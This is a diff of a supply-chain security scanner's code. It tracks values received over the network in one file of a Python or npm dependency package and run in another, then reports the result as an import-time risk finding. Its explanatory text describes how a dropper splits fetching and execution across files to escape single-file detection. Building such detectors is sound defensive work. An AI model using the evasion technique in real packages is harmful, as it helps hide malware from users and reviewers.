+            return self.resolve_chain(mod, exp[1], None, depth + 1)
+        if exp is not None:
+            return self.resolve_local(mod, exp, depth + 1)
+        re_ = mod.reexports.get(name)
+        if re_ is not None:
+            if re_[0] is None:
+                return None
+            return ("module", re_[0]) if re_[1] is None else self.resolve_export(re_[0], re_[1], depth + 1)
+        for star in mod.stars + ([mod.default_module] if mod.default_module else []):
+            got = self.resolve_export(star, name, depth + 1)
+            if got is not None:
+                return got
+        if mod.default is not None and name != "default":   # module.exports = api: api's members
+            return self.resolve_chain(mod, mod.default + "." + name, None, depth + 1)
+        return None
+
+    def resolve_chain(self, mod, chain, cls, depth=0):
+        """What the member chain `chain` names in `mod` (inside class `cls`:
+        self.x / this.x is the class's own member)."""
+        parts = chain.split(".")
+        if cls is not None and parts[0] in ("self", "this", "cls") and len(parts) >= 2:
+            if parts[1] in mod.classes.get(cls, {}):
+                return "sym", (mod.key, cls + "." + parts[1])
+            return None
+        got, used = None, 0
+        for i in range(len(parts), 0, -1):          # a dotted import (pkg._net) is one name
+            head = ".".join(parts[:i])
+            if head in mod.imports or (i == 1 and (head in mod.defs or head in mod.classes)):
+                got, used = self.resolve_local(mod, head, depth + 1), i
+                break
+        rest = parts[used:]
+        while got is not None and rest:
+            kind, val = got
+            if kind == "module":
+                got = self.resolve_export(val, rest[0], depth + 1)
+            elif kind == "class":
+                meths = self.mods[val[0]].classes.get(val[1], {})
+                got = ("sym", (val[0], val[1] + "." + rest[0])) if rest[0] in meths else None
+            else:
+                return got
+            rest = rest[1:]
+        return got
+
+    def symbols(self):
+        """{(key, name): (mod, source, refs, cls)} of every function, value,
+        member and environment variable write, at most _XF_MAX_SYMBOLS."""
+        out = {}
+        for mod in self.mods.values():
+            for name, (source, refs) in mod.defs.items():
+                out[(mod.key, name)] = (mod, source, refs, None)
+            for cls, meths in mod.classes.items():
+                for meth, ((source, refs), _static) in meths.items():
+                    out[(mod.key, cls + "." + meth)] = (mod, source, refs, cls)
+            for var, (source, refs) in mod.env.items():
+                out[(mod.key, "<env>." + var)] = (mod, source, refs, None)
+            if len(out) >= _XF_MAX_SYMBOLS:
+                break
+        return out
+
+    def tainted(self):
+        """The symbols that hold a received value (see the section comment)."""
+        syms = self.symbols()
+        edges = {}
+        for sym, (mod, _source, refs, cls) in syms.items():
+            found = []
+            for chain in refs:
+                got = self.resolve_chain(mod, chain, cls)
+                if got is not None and got[0] == "sym":
+                    found.append(got[1])
+            edges[sym] = found
+        tainted = {sym for sym, (_m, source, _r, _c) in syms.items() if source}
+        for _ in range(_XF_ROUNDS):
+            grew = {sym for sym, found in edges.items() if sym not in tainted and any(f in tainted for f in found)}
+            if not grew:
+                break
+            tainted |= grew
+        return tainted
+
+    def runners(self):
+        """The functions that run a parameter as code (def execute(c):
+        exec(c)): their body read by the single-file detector with the
+        parameters seeded. At most _XF_MAX_RUNNERS bodies are read."""
+        out, count = set(), 0
+        for mod in self.mods.values():
+            for sym, (params, body) in mod.bodies.items():
+                names = sorted(set(params) - _XF_NOT_PARAMS)
+                if not names:
+                    continue
+                count += 1
+                if count > _XF_MAX_RUNNERS:
+                    return out
+                res = _received_code_kind("\n".join(body), extra_always=names)
+                if res is not None and res[1] == "run":
+                    out.add((mod.key, sym))
+        return out
+
+    def names_of(self, key, depth=0):
+        """The names module `key` exports, for its members (m.pull)."""
+        mod = self.mods.get(key)
+        if mod is None or depth > _XF_MAX_DEPTH:
+            return set()
+        if mod.lang == "py":
+            return set(mod.defs) | set(mod.classes) | {n for n in mod.imports if not n.startswith("*")}
+        out = set(mod.exports) | set(mod.reexports)
+        for star in mod.stars + ([mod.default_module] if mod.default_module else []):
+            out |= self.names_of(star, depth + 1)
+        return out
+
+
+def _xf_instances(text, expr, lang):
+    """Local names — or an instance's own, self.c / this.c — assigned an
+    instance of the class named by `expr` (`v = C(…)`, `this.c = new ns.C(…)`)."""
+    new = r"(?:new[ \t]+)?" if lang == "js" else ""
+    rx = re.compile(r"(?<![\w$.])(?P<var>(?:(?:self|this)[ \t]*\.[ \t]*)?[A-Za-z_$][\w$]*)[ \t]*=[ \t]*" + new
+                    + re.escape(expr) + r"[ \t]*\(")
+    return {_XF_SPACE_RE.sub("", m.group("var")) for m in rx.finditer(text)}
+
+
+def _xf_marked_members(pkg, marked):
+    """{(module key, class): [(member, static)]} of the `marked` members, in
+    the class's order: what _xf_seeds reads of a class, once per package."""
+    out = {}
+    for mod in pkg.mods.values():
+        for cls, meths in mod.classes.items():
+            got = [(meth, static) for meth, (_ret, static) in meths.items() if (mod.key, cls + "." + meth) in marked]
+            if got:
+                out[(mod.key, cls)] = got
+    return out
+
+
+def _xf_seeds(pkg, mod, marked, envs, members=None):
+    """({chain: where it comes from}, [(expr, member, label)]) for module
+    `mod`: the names that name a `marked` symbol in it (see the section
+    comment), and the classes whose member a new instance's call reaches
+    directly (C().pull()). `members`: _xf_marked_members(pkg, marked)."""
+    seeds, direct = {}, []
+    code = mod.text
+    if members is None:
+        members = _xf_marked_members(pkg, marked)
+
+    def add_class(expr, val, label):
+        for meth, static in members.get(val, ()):
+            if static:
+                seeds[expr + "." + meth] = label
+                continue
+            for var in sorted(_xf_instances(code, expr, mod.lang)):
+                seeds[var + "." + meth] = label
+            direct.append((expr, meth, label))
+
+    def add(expr, got, label, depth=0):
+        if got is None or depth > 2:
+            return
+        kind, val = got
+        if kind == "sym":
+            if val in marked:
+                seeds[expr] = label
+        elif kind == "class":
+            add_class(expr, val, label)
+        elif kind == "module":
+            for name in sorted(pkg.names_of(val))[:_XF_MAX_SEEDS * 4]:
+                sub = pkg.export(val, name)
+                if sub is not None and sub[0] != "module":
+                    add(expr + "." + name, sub, label, depth + 1)
+            if val in pkg.mods and pkg.mods[val].lang == "js":      # (a re-export may name a missing module)
+                add(expr, pkg.export(val, "default"), label, depth + 1)
+
+    for local, imp in mod.imports.items():
+        if local.startswith("*"):
+            if imp[0] in pkg.mods:
+                for name in sorted(pkg.names_of(imp[0])):
+                    add(name, pkg.export(imp[0], name), imp[3])
+            continue
+        got = pkg.resolve_import(imp)
+        if got is None and mod.lang == "js" and imp[2] == "default" and imp[0] in pkg.mods:
+            got = ("module", imp[0])                 # a CommonJS module imported by default is its exports
+        add(local, got, imp[3])
+    for var, label in envs.items():
+        if var in code:
+            seeds[("environ." if mod.lang == "py" else "process.env.") + var] = label
+    return seeds, direct
+
+
+def _xf_rewrite(code, direct, lang):
+    """`code` with each call of a method on a new instance (`C().pull`,
+    `new ns.C(x).pull`) read as one seeded name, padded to its length;
+    returns (code, {name: label})."""
+    names = {}
+    for n, (expr, meth, label) in enumerate(direct[:_XF_MAX_SEEDS]):
+        new = r"(?:new[ \t]+)?" if lang == "js" else ""
+        rx = re.compile(r"(?<![\w$.])" + new + re.escape(expr) + r"[ \t]*\([^()\n]{0,200}\)[ \t]*\.[ \t]*"
+                        + re.escape(meth) + r"(?![\w$])")
+        name = f"_xf{n}"
+        code, count = rx.subn(lambda m: name.ljust(len(m.group())), code)
+        if count:
+            names[name] = label
+    return code, names
+
+
+_XF_WHY = (
+    "A dropper can split what it downloads and the code that runs it across two files of a "
+    "package, so neither file shows the shape alone: one fetches, the other runs what the "
+    "first returns. Running code a server sends is the shape no library needs — whoever "
+    "controls the server chooses what runs.")
+
+
+def _xf_issue(path, line, text, cat, srcs, who="Dependency code", runner=False):
+    """The follower's SC-IMPORT-RISK finding; `who` starts the message ("Dependency
+    code"; a registry scan names the file). `runner`: the value is received
+    here and run by a function of another file."""
+    lines = text.split("\n")
+    where = ", ".join(srcs)
+    tail = (f"the function that runs it is in another file of the package ({where})" if runner
+            else f"the value is received in another file of the package ({where})")
+    return mk_issue(
+        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT",
+         "sev": import_time_severity([_DL_CATEGORY_REASON[cat]]),
+         "msg": f"{who} {_DL_CATEGORY_REASON[cat]}; {tail}.", "why": _XF_WHY,
+         "fix": (f"Read both files: what does this file receive, and what does {where} run?" if runner
+                 else f"Read both files: what does {where} receive, and what runs it here?"),
+         "ref": "CWE-506 · Supply chain"}, path, line, lines, redactor=_Redactor(lines))
 
 
 def _xf_py_module(path):
@@ -9384,249 +11991,6 @@ def _xf_resolve(mod_spec, pkg_parts):
     return ".".join(target) or None
 
 
-def _xf_imported_taint(text, module, is_pkg, exports):
-    """{local name (or instance.method chain): source module} for names this
-    module imports, from a sibling module of the same top package, that are that
-    sibling's tainted exports — a value/function directly, or a class whose
-    tainted method is called on an instance made here (`c = C(); exec(c.pull())`)."""
-    if "import" not in text:
-        return {}
-    masked = "\n".join(_xf_py_mask(text))
-    pkg_parts = module.split(".") if is_pkg else module.split(".")[:-1]
-    top = module.split(".")[0]
-    seeds = {}
-    imported_classes = {}                       # local class name -> (methods, source module)
-    for m in _XF_FROM_RE.finditer(masked):
-        target = _xf_resolve(m.group("mod"), pkg_parts)
-        if target is None or target.split(".")[0] != top:
-            continue
-        info = exports.get(target)
-        if not info:
-            continue
-        values, classes = info
-        names = m.group("names").strip()
-        if names == "*":
-            for name in values:
-                seeds[name] = target
-            for cname, methods in classes.items():
-                imported_classes[cname] = (methods, target)
-            continue
-        for item in names.strip("()").split(","):
-            parts = item.split()
-            if not parts:
-                continue
-            exp = parts[0]
-            local = parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0]
-            if exp in values:
-                seeds[local] = target
-            elif exp in classes:
-                imported_classes[local] = (classes[exp], target)
-    for cname, (methods, target) in imported_classes.items():
-        for var in _xf_py_instances(masked, cname):
-            for meth in methods:
-                seeds[var + "." + meth] = target
-    return seeds
-
-
-def _xf_issue(path, line, text, cat, srcs):
-    lines = text.split("\n")
-    where = ", ".join(srcs)
-    msg = (f"Dependency code {_DL_CATEGORY_REASON[cat]}; the value is received in "
-           f"another file of the package ({where}).")
-    return mk_issue(
-        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT",
-         "sev": import_time_severity([_DL_CATEGORY_REASON[cat]]),
-         "msg": msg, "why": _DEP_IMPORT_RISK_WHY,
-         "fix": f"Read both files: what does {where} receive, and what runs it here?",
-         "ref": "CWE-506 · Supply chain"}, path, line, lines, redactor=_Redactor(lines))
-
-
-def _xf_python_pass(files, skip):
-    """The Python half of the cross-file follower (see _cross_file_received_issues)."""
-    groups = {}
-    for f in files:
-        if not f.get("dep") or f["lang"] != "py":
-            continue
-        info = _xf_py_module(f["path"])
-        if info is not None:
-            groups.setdefault(info[0], []).append((info[1], info[2], f))
-    out = []
-    for members in groups.values():
-        if not 2 <= len(members) <= _XF_MAX_FILES:      # needs >= 2; a huge package is skipped
-            continue
-        try:
-            exports = {module: _xf_tainted_exports(f["content"]) for module, _pkg, f in members}
-            if not any(values or classes for values, classes in exports.values()):
-                continue
-            for module, is_pkg, f in members:
-                if f["path"].replace(os.sep, "/") in skip:
-                    continue
-                seeds = _xf_imported_taint(f["content"], module, is_pkg, exports)
-                if not seeds:
-                    continue
-                res = _received_code_kind(f["content"], extra_always=set(list(seeds)[:_XF_MAX_SEEDS]))
-                if res is not None:
-                    out.append(_xf_issue(f["path"], res[0], f["content"], res[1], sorted(set(seeds.values()))))
-        except Exception:                       # one package must never kill the scan
-            continue
-    return out
-
-
-# --- JavaScript cross-file: require()/import of a sibling module's export ---
-# The same idea for an npm package's own files. Export detection is deliberately
-# liberal (a function that fetches and returns is a "tainted export" — many real
-# HTTP libraries do exactly that): the finding is held precise by the sink side,
-# which fires only when the imported value is actually RUN (eval / Function /
-# child_process / a deserializer / a dynamic import), so a package that merely
-# returns received data over its API is not flagged. One hop, within one package.
-_XF_JS_FUNC_RE = re.compile(r"\bfunction[ \t]*\*?[ \t]*(?P<name>[A-Za-z_$][\w$]*)[ \t]*\(")
-_XF_JS_ASSIGN_RE = re.compile(r"\b(?:const|let|var)[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=])(?P<rhs>.*)$")
-_XF_JS_CLASS_RE = re.compile(r"\bclass[ \t]+(?P<name>[A-Za-z_$][\w$]*)")
-# a class method's shorthand header: `pull(args) {`, `async pull(args) {`, `*g(){`, `get x() {`
-_XF_JS_METHOD_RE = re.compile(
-    r"(?:^|[ \t;{}])(?:async[ \t]+)?(?:\*[ \t]*)?(?:(?:get|set)[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*\([^()]*\)[ \t]*\{")
-_XF_JS_KEYWORDS = frozenset({"if", "for", "while", "switch", "catch", "function", "return", "do", "else",
-                             "with", "constructor", "class"})
-_XF_JS_NEW_TMPL = r"(?<![\w$.])(?P<var>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*new[ \t]+(?:[\w$]+\.)*%s[ \t]*\("
-_XF_JS_EXPORT_DECL_RE = re.compile(
-    r"\bexport[ \t]+(?:default[ \t]+)?(?:async[ \t]+)?"
-    r"(?:function[ \t]*\*?[ \t]*|(?:const|let|var)[ \t]+|class[ \t]+)(?P<name>[A-Za-z_$][\w$]*)")
-_XF_JS_EXPORT_LIST_RE = re.compile(r"\bexport[ \t]*\{(?P<names>[^{}]*)\}")
-_XF_JS_MODEXP_OBJ_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*\{(?P<names>[^{}]*)\}")
-_XF_JS_MODEXP_PROP_RE = re.compile(
-    r"\b(?:module\s*\.\s*exports|exports)\s*\.\s*(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=])(?P<rhs>[^\n]*)")
-_XF_JS_EXPORT_DEFAULT_RE = re.compile(r"\bexport[ \t]+default[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*;?[ \t]*$", re.M)
-_XF_JS_MODEXP_ALL_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*(?P<name>[A-Za-z_$][\w$]*)[ \t]*;?[ \t]*$", re.M)
-_XF_JS_REQ_DESTR_RE = re.compile(
-    r"\b(?:const|let|var)[ \t]*\{(?P<names>[^{}]*)\}[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"]+)['\"]")
-_XF_JS_REQ_NS_RE = re.compile(
-    r"\b(?:const|let|var)[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"]+)['\"]")
-_XF_JS_IMP_NAMED_RE = re.compile(
-    r"\bimport[ \t]*(?:[A-Za-z_$][\w$]*[ \t]*,[ \t]*)?\{(?P<names>[^{}]*)\}[ \t]*from[ \t]*['\"](?P<mod>[^'\"]+)['\"]")
-_XF_JS_IMP_NS_RE = re.compile(
-    r"\bimport[ \t]*\*[ \t]*as[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*from[ \t]*['\"](?P<mod>[^'\"]+)['\"]")
-_XF_JS_IMP_DEFAULT_RE = re.compile(
-    r"\bimport[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*(?:,[ \t]*\{[^{}]*\})?[ \t]*from[ \t]*['\"](?P<mod>[^'\"]+)['\"]")
-
-
-def _xf_js_mask_line(row):
-    """`row` with each string literal's contents blanked (quotes kept) and a
-    trailing // comment cut, so a source inside a string or comment is not read."""
-    masked = _DL_STR_RE.sub(lambda m: m.group()[0] + " " * (len(m.group()) - 2) + m.group()[-1]
-                            if len(m.group()) >= 2 else m.group(), row)
-    i = masked.find("//")
-    return masked[:i] if i >= 0 else masked
-
-
-def _xf_js_destr(names):
-    """[(export/property name, local name)] for a `{ a, b as c, d: e }` list."""
-    out = []
-    for item in names.split(","):
-        parts = item.replace(":", " ").replace(" as ", " ").split()
-        if len(parts) == 1:
-            out.append((parts[0], parts[0]))
-        elif len(parts) >= 2:
-            out.append((parts[0], parts[1]))
-    return out
-
-
-def _xf_js_row_classes(rows):
-    """For each masked row, the name of the class whose body encloses it (or
-    None) — a brace-depth pass pairing `class NAME … {` with its `}`."""
-    row_class = [None] * len(rows)
-    depth, stack, pending = 0, [], None         # stack entries: (class name, body depth)
-    for k, row in enumerate(rows):
-        row_class[k] = stack[-1][0] if stack else None
-        events = [(m.start(), "c", m.group("name")) for m in _XF_JS_CLASS_RE.finditer(row)]
-        events += [(m.start(), m.group(), None) for m in re.finditer(r"[{}]", row)]
-        events.sort()
-        for _pos, kind, name in events:
-            if kind == "c":
-                pending = name
-            elif kind == "{":
-                if pending is not None:
-                    stack.append((pending, depth))
-                    pending = None
-                depth += 1
-            else:
-                depth -= 1
-                if stack and stack[-1][1] == depth:
-                    stack.pop()
-    return row_class
-
-
-def _xf_js_tainted_exports(text):
-    """(named values, {class: methods}, default) of a JS module whose functions,
-    consts or class methods hold or return a received value. `default` is False,
-    True (a value) or a frozenset of method names (a default-exported class).
-    Liberal by design; the sink side keeps the finding precise. Bounded: indexed
-    source/return rows, a body read for _XF_WINDOW rows, one brace pass."""
-    if not any(n in text for n in _DL_NEEDLES):
-        return frozenset(), {}, False
-    rows = [_xf_js_mask_line(r) for r in text.split("\n")]
-    src_rows = [k for k, r in enumerate(rows) if next(_dl_finditer(_DL_SOURCE, r), None) is not None]
-    ret_rows = [k for k, r in enumerate(rows) if "return" in r]
-    row_class = _xf_js_row_classes(rows)
-
-    def near(idx, a, b):
-        i = bisect.bisect_left(idx, a)
-        return i < len(idx) and idx[i] < b
-
-    tainted, classes = set(), {}
-    for k, row in enumerate(rows):
-        end = k + _XF_WINDOW
-        body = near(src_rows, k, end) and near(ret_rows, k, end)
-        cur = row_class[k]
-        for m in _XF_JS_FUNC_RE.finditer(row):
-            if body:
-                (classes.setdefault(cur, set()).add if cur else tainted.add)(m.group("name"))
-        if cur is not None and body:
-            for m in _XF_JS_METHOD_RE.finditer(row):
-                if m.group("name") not in _XF_JS_KEYWORDS:
-                    classes.setdefault(cur, set()).add(m.group("name"))
-        elif cur is None:
-            m = _XF_JS_ASSIGN_RE.search(row)
-            if m is not None:
-                rhs = m.group("rhs")
-                rhs_src = next(_dl_finditer(_DL_SOURCE, rhs), None) is not None
-                if "=>" in rhs or rhs.lstrip().startswith(("function", "async")):
-                    if rhs_src or (near(src_rows, k, end) and (near(ret_rows, k, end) or "=>" in rhs)):
-                        tainted.add(m.group("name"))
-                elif rhs_src:
-                    tainted.add(m.group("name"))
-    masked = "\n".join(rows)
-    named, named_classes = set(), {}
-
-    def note(exported, local):
-        if local in tainted:
-            named.add(exported)
-        elif local in classes:
-            named_classes[exported] = frozenset(classes[local])
-
-    for m in _XF_JS_EXPORT_DECL_RE.finditer(masked):        # export function/const/class NAME
-        note(m.group("name"), m.group("name"))
-    for m in _XF_JS_EXPORT_LIST_RE.finditer(masked):        # export { local as exported }
-        for local, exported in _xf_js_destr(m.group("names")):
-            note(exported, local)
-    for m in _XF_JS_MODEXP_OBJ_RE.finditer(masked):         # module.exports = { exported: local }
-        for exported, local in _xf_js_destr(m.group("names")):
-            note(exported, local)
-    for m in _XF_JS_MODEXP_PROP_RE.finditer(masked):        # module.exports.NAME = local
-        local = m.group("rhs").strip().rstrip(";").strip()
-        if next(_dl_finditer(_DL_SOURCE, m.group("rhs")), None) is not None:
-            named.add(m.group("name"))
-        else:
-            note(m.group("name"), local)
-    default = False
-    for m in list(_XF_JS_EXPORT_DEFAULT_RE.finditer(masked)) + list(_XF_JS_MODEXP_ALL_RE.finditer(masked)):
-        name = m.group("name")
-        if name in tainted:
-            default = True
-        elif name in classes and default is False:
-            default = frozenset(classes[name])
-    return frozenset(named), named_classes, default
-
-
 def _xf_js_package(path):
     """The npm package root ('/'-separated) a dependency file lives in
     (node_modules/<name> or node_modules/@scope/<name>, innermost), else None."""
@@ -9648,106 +12012,88 @@ def _xf_js_norm(rel):
     return rel[:-6] if rel.endswith("/index") else rel
 
 
-def _xf_js_seeds(text, exports_of):
-    """{local name (or instance.method / ns.member chain): module spec} seeded
-    from this file's imports of a sibling module's tainted exports — a value
-    directly, or a class whose tainted method is called on an instance made here
-    (`const c = new C(); c.pull().then(eval)`). exports_of(spec) -> (values,
-    classes, default)|None. Read on the raw text (module specifiers and imported
-    names are tokens the require()/import patterns need whole)."""
-    seeds = {}
-    imported_classes = {}                       # local class name -> (methods, module spec)
-
-    def named_import(mod, pairs):
-        info = exports_of(mod)
-        if info is None:
-            return
-        values, classes, _default = info
-        for exp, local in pairs:                # exp = name in module, local = local binding
-            if exp in values:
-                seeds[local] = mod
-            elif exp in classes:
-                imported_classes[local] = (classes[exp], mod)
-
-    def namespace(mod, ns):
-        info = exports_of(mod)
-        if info is None:
-            return
-        values, _classes, default = info
-        for e in values:
-            seeds[ns + "." + e] = mod
-        if default is True:
-            seeds[ns] = mod
-        elif default:                           # a default-exported class bound to `ns`
-            imported_classes[ns] = (default, mod)
-
-    for m in _XF_JS_REQ_DESTR_RE.finditer(text):
-        named_import(m.group("mod"), _xf_js_destr(m.group("names")))
-    for m in _XF_JS_IMP_NAMED_RE.finditer(text):
-        named_import(m.group("mod"), _xf_js_destr(m.group("names")))
-    for m in _XF_JS_REQ_NS_RE.finditer(text):
-        namespace(m.group("mod"), m.group("ns"))
-    for m in _XF_JS_IMP_NS_RE.finditer(text):
-        namespace(m.group("mod"), m.group("ns"))
-    for m in _XF_JS_IMP_DEFAULT_RE.finditer(text):
-        info = exports_of(m.group("mod"))
-        if info is None:
-            continue
-        if info[2] is True:
-            seeds[m.group("name")] = m.group("mod")
-        elif info[2]:                           # default-exported class
-            imported_classes[m.group("name")] = (info[2], m.group("mod"))
-    for cls_local, (methods, mod) in imported_classes.items():
-        rx = re.compile(_XF_JS_NEW_TMPL % re.escape(cls_local))
-        for im in rx.finditer(text):
-            for meth in methods:
-                seeds[im.group("var") + "." + meth] = mod
-    return seeds
-
-
-def _xf_js_pass(files, skip):
-    """The JavaScript half of the cross-file follower (see _cross_file_received_issues)."""
-    groups = {}
-    for f in files:
-        if not f.get("dep") or f["lang"] != "js":
-            continue
-        root = _xf_js_package(f["path"])
-        if root is not None:
-            groups.setdefault(root, []).append(f)
+def _xf_package_issues(mods, skip, who):
+    """The follower's findings for one package's modules (see the section comment)."""
+    pkg = _XfPackage(mods)
+    tainted = pkg.tainted()
+    runners = pkg.runners()
+    if not tainted and not runners:
+        return []
+    envs = {}
+    for key, name in sorted(tainted):
+        if name.startswith("<env>."):
+            envs.setdefault(name[len("<env>."):], key)
+    held, running = _xf_marked_members(pkg, tainted), _xf_marked_members(pkg, runners)
     out = []
-    for root, members in groups.items():
-        if len(members) < 2:
+    for mod in mods.values():
+        if mod.path.replace(os.sep, "/") in skip:
             continue
-        try:
-            exports = {}
-            for f in members:
-                rel = f["path"].replace(os.sep, "/")[len(root) + 1:]
-                exports[_xf_js_norm(rel)] = _xf_js_tainted_exports(f["content"])
-            if not any(v or c or d for v, c, d in exports.values()):
-                continue
-            for f in members:
-                if f["path"].replace(os.sep, "/") in skip:
-                    continue
-                impdir = posixpath.dirname(f["path"].replace(os.sep, "/")[len(root) + 1:])
-                seeds = _xf_js_seeds(f["content"], lambda mod: exports.get(
-                    _xf_js_norm(posixpath.normpath(posixpath.join(impdir, mod)))) if mod.startswith(".") else None)
-                if not seeds:
-                    continue
-                res = _received_code_kind(f["content"], extra_always=set(seeds))
-                if res is not None:
-                    out.append(_xf_issue(f["path"], res[0], f["content"], res[1], sorted(set(seeds.values()))))
-        except Exception:                       # one package must never kill the scan
+        seeds, direct = _xf_seeds(pkg, mod, tainted, envs, held) if tainted else ({}, [])
+        run_seeds = _xf_seeds(pkg, mod, runners, {}, running)[0] if runners else {}
+        if not seeds and not direct and not run_seeds:
             continue
+        code = _import_code(mod.text, mod.lang)
+        if _received_code_kind(code) is not None:
+            continue                                    # the file shows it alone: the single-file test's
+        code, more = _xf_rewrite(code, direct, mod.lang)
+        seeds.update(more)
+        names = sorted(seeds)[:_XF_MAX_SEEDS]
+        who_ = who(mod.path) if callable(who) else who
+        res = _received_code_kind(code, extra_always=names) if names else None
+        if res is not None:
+            out.append(_xf_issue(mod.path, res[0], mod.text, res[1], sorted({seeds[n] for n in names}), who_))
+            continue
+        if run_seeds:
+            run_names = sorted(run_seeds)[:_XF_MAX_SEEDS]
+            res = _received_code_kind(code, extra_always=names, extra_runners=run_names)
+            if res is not None and res[1] == "run":
+                out.append(_xf_issue(mod.path, res[0], mod.text, "run", sorted({run_seeds[n] for n in run_names}),
+                                     who_, runner=True))
     return out
 
 
-def _cross_file_received_issues(files, skip_paths=()):
-    """SC-IMPORT-RISK (MAJOR) for each dependency file that runs a value received
-    over the network in another file of the same package (see the section
-    comment), in Python and in npm packages. Skips files already flagged
-    single-file. Best-effort: a package that raises is skipped."""
+def _cross_file_received_issues(files, skip_paths=(), who="Dependency code", one_package=False):
+    """SC-IMPORT-RISK for each dependency file that runs a value received over
+    the network in another file of the same package, or receives one and
+    hands it to another file's function that runs it (see the section
+    comment), in Python and in npm packages. Skips the files in `skip_paths`
+    (those already flagged single-file). `who(path)` may name the file in the
+    message. A registry scan reads one distribution: `one_package` groups all
+    its Python modules as one package (its top-level packages and modules
+    import each other). Best-effort: a package that raises is skipped."""
     skip = set(skip_paths)
-    return _xf_python_pass(files, skip) + _xf_js_pass(files, skip)
+    groups = {}
+    for f in files:
+        if not f.get("dep"):
+            continue
+        if f["lang"] == "py":
+            info = _xf_py_module(f["path"])
+            if info is not None:
+                groups.setdefault(("py", "" if one_package else info[0]), []).append((info[1], info[2], f))
+        elif f["lang"] == "js":
+            root = _xf_js_package(f["path"])
+            if root is not None:
+                rel = f["path"].replace(os.sep, "/")[len(root) + 1:]
+                groups.setdefault(("js", root), []).append((_xf_js_norm(rel), rel, f))
+    out = []
+    for (lang, _root), members in groups.items():
+        if not 2 <= len(members) <= _XF_MAX_FILES:      # needs >= 2; a huge package is skipped
+            continue
+        if not any(any(n in f["content"] for n in _DL_NEEDLES) for _k, _x, f in members):
+            continue                                    # no network source anywhere: nothing is received
+        try:
+            mods = {}
+            for key, extra, f in members:
+                mod = _XfModule(key, lang, f["path"], f["content"])
+                if lang == "py":
+                    _xf_py_parse(mod, key.split(".") if extra else key.split(".")[:-1])
+                else:
+                    _xf_js_parse(mod, extra)
+                mods[key] = mod
+            out.extend(_xf_package_issues(mods, skip, who))
+        except Exception:                               # one package must never kill the scan
+            continue
+    return out
 
 
 def dependency_checks(root, files, manifests, issues, excludes=(), should_stop=None):
@@ -9773,27 +12119,39 @@ def dependency_checks(root, files, manifests, issues, excludes=(), should_stop=N
             _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end)
         except Exception as exc:            # one manifest must never kill the run
             out.append(scan_error_issue(issue["file"], exc))
-    for f in files:
-        if not f.get("dep") or f["lang"] not in ("js", "py") or f["path"].replace(os.sep, "/") in run:
-            continue
+    # the import-time test for each dependency file, a batch at a time: the
+    # native engine reads a batch on threads (engine.py); the Python engine
+    # one file at a time, as it always has
+    from lazaret.scanner import engine
+    todo = [f for f in files
+            if f.get("dep") and f["lang"] in ("js", "py") and f["path"].replace(os.sep, "/") not in run]
+    size = engine.BATCH if engine.name() == "rust" else 1
+    for start in range(0, len(todo), size):
         if should_stop is not None:
             stopped = should_stop()
             if stopped:
                 return out, extra, stopped
+        chunk = todo[start:start + size]
         try:
-            found = dependency_import_issue(f["path"], f["content"], f["lang"])
-            agent = dependency_agent_issue(f["path"], f["content"])
-        except Exception as exc:
-            found, agent = scan_error_issue(f["path"], exc), None
-        if found is not None:
-            out.append(found)
-        if agent is not None:
-            out.append(agent)
-    # Cross-file received code (Python engine only): a value received in one file
-    # of a package and run in another. Reached only when the checks above did not
-    # stop (each returns early on should_stop), so no extra should_stop call here —
-    # it is a bounded pass. Skips files already flagged single-file.
-    flagged = {i["file"].replace(os.sep, "/") for i in out if i["rule"] == "SC-IMPORT-RISK"}
+            risks = engine.import_time_risks([(f["content"], f["lang"]) for f in chunk])
+        except Exception:                   # each file is then read on its own below
+            risks = [None] * len(chunk)
+        for f, risk in zip(chunk, risks):
+            try:
+                found = dependency_import_issue(f["path"], f["content"], f["lang"], risk=risk)
+                agent = dependency_agent_issue(f["path"], f["content"])
+            except Exception as exc:
+                found, agent = scan_error_issue(f["path"], exc), None
+            if found is not None:
+                out.append(found)
+            if agent is not None:
+                out.append(agent)
+    # Cross-file received code (both engines since 0.1.8): a value received in one
+    # file of a package and run in another. Reached only when the checks above did
+    # not stop (each returns early on should_stop), so no extra should_stop call
+    # here — it is a bounded pass. Skips the files already flagged CRITICAL
+    # single-file (a MAJOR one can still be found running what another file received).
+    flagged = {i["file"].replace(os.sep, "/") for i in out if i["rule"] == "SC-IMPORT-RISK" and i["sev"] == "CRITICAL"}
     out.extend(_cross_file_received_issues(files, flagged))
     return out, extra, None
 
@@ -9835,6 +12193,7 @@ def _implicit_gyp_hooks(tree, manifests):
 
 
 def _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end):
+    from lazaret.scanner import engine     # (imported here: engine imports core)
     manifest = issue["file"]
     base = posixpath.dirname(manifest.replace(os.sep, "/"))
     direct = agent_hijack_in_command(issue["cmd"])         # the hook runs the agent itself
@@ -9862,7 +12221,7 @@ def _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end):
         if rel is None:
             continue
         text = _dependency_script_text(tree, rel, "sh" if rel.endswith(".sh") else "js", out, extra, run)
-        reasons = install_script_risk(text) if text else []
+        reasons = engine.install_script_risk(text) if text else []
         if reasons and issue["sev"] not in ("BLOCKER", "CRITICAL"):
             msg = f"Install hook runs {target}, which {'; and '.join(reasons)}."
             issue["sev"] = "CRITICAL"
@@ -9870,6 +12229,37 @@ def _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end):
         agent = dependency_agent_issue(rel.replace("/", os.sep), text) if text else None
         if agent is not None:
             out.append(agent)
+        # the scripts it starts with node or python (0.1.8, spawned_scripts)
